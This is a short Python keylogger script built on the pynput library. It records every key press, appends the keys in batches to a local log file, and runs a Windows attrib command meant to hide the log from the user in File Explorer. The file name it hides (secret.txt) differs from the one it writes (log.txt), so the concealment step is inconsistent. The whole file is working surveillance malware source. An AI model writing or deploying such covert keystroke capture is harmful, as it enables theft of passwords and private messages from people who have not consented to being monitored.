import pynput
from pynput.keyboard import Key, Listener
from subprocess import check_output

# hide log from user in file explorer
check_output("attrib +s +h \"secret.txt\"", shell=True)

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # log every 10 key presses
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    # append to or create log file this is the functional log
    with open("log.txt", "a+") as f:
        temp = ""
        for key in keys:
            if key == Key.space:
                # newline if space
                temp += "\n"
            elif str(key).find("Key") != -1:
                # if other key press (alt, tab, etc.) add newlines around it
                temp += "\n" + str(key) + "\n"
            elif key == Key.shift:
                # catch for things we don't want to log
                pass
            else:
                # add normal characters
                key = str(key)
                temp += key[1]
        f.write(temp)


def on_release(key):
    # in case I want to test on release
    pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
